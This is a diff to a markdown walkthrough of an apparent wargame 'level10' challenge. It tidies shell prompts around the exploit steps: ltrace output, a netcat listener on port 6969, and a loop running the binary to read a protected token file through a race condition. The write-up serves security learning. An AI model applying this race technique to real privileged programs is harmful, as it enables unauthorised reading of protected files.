@@ -47,6 +47,7 @@ But how to read the `token` file? The program seems to before check for the file
 $ ltrace ./level10 token 127.0.0.1
 access("token", 4) = -1
 printf("You don't have access to %s\n", "token") = 31
+...
 ```
 
 ```bash
@@ -82,13 +83,13 @@ done
 In another terminal, start a netcat with filters to remove useless content:
 
 ```bash
-nc -lkvn 0.0.0.0 6969 2>&1 | grep -v 'Connection from' | grep -v 'dummy' | grep -v '( )'
+$ nc -lkvn 0.0.0.0 6969 2>&1 | grep -v 'Connection from' | grep -v 'dummy' | grep -v '( )'
 ```
 
 In again another terminal, start the `level10` executable in a loop:
 
 ```bash
-while true; do
+$ while true; do
   ./level10 /tmp/level10 127.0.0.1;
 done
 ```
